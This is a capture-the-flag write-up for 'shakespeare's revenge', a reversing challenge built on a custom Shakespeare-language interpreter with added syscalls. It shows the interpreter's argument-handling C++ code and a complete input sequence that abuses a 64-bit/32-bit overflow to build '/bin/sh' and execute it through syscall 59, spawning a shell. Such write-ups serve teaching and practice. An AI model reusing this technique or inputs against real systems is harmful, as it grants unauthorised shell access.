# shakespeare's revenge
I wrote a shakespearelang jail last year using the standard python implementation, but this year I decided to make my own shakespeare interpreter and use it as a reversing challenge. 

My implementation was based heavily on the [python implementation](https://github.com/zmbc/shakespearelang/). However, I decided to add a couple more capabilities. First, I added a "reference" variable which allows one character in a play to point to another. This allows for some implementations of linked lists in shakespeare. Then, I added syscalls using the "revere" keyword. These syscalls pop one value off of the target character's stack, use it as the syscall number, then pop off the corresponding number of arguments for that syscall. The calculator I gave in the challenge is set up such that one syscall is executed upon exit.

## Solve
String arguments are able to be passed to syscalls by building the string in another character's stack then setting this calling character's reference value to the character containing the string. 
```cpp
character.pop();
std::vector<long long> args;
args.reserve(static_cast<std::size_t>(arg_count.value()));
constexpr long long u32_max_sentinel = static_cast<long long>(std::numeric_limits<std::uint32_t>::max());
std::optional<std::string> referenced_cstring;
for (int i = 0; i < arg_count.value(); ++i) {
    long long argument = character.pop();
    if (argument == u32_max_sentinel) {
        if (!referenced_cstring.has_value()) {
            referenced_cstring = referenced_character.reference_stack_cstring();
        }
        argument = static_cast<long long>(
            reinterpret_cast<std::uintptr_t>(referenced_cstring->c_str())
        );
    }
    args.push_back(argument);
}
```
This is a flawed system, but it was good enough for the challenge. You then use the value -1 to insert that string as an arg.

A character's value is a 64 bit integer where the stack allows 32 bit integers. This overflow allows you to set extra values in the calculator to build the string "/bin/sh" and then execute it with a syscall. My inputs are below:

```
446676598785
2
2
493921239041
2
2
201863462913
2
2
472446402561
2
2
450971566081
2
2
420906795009
2
2
201863462913
2
2
0
0
2
0
0
2
4294967295
0
2
59
0
2
46
47
12
```

and it will spawn a shell with the syscall at the end.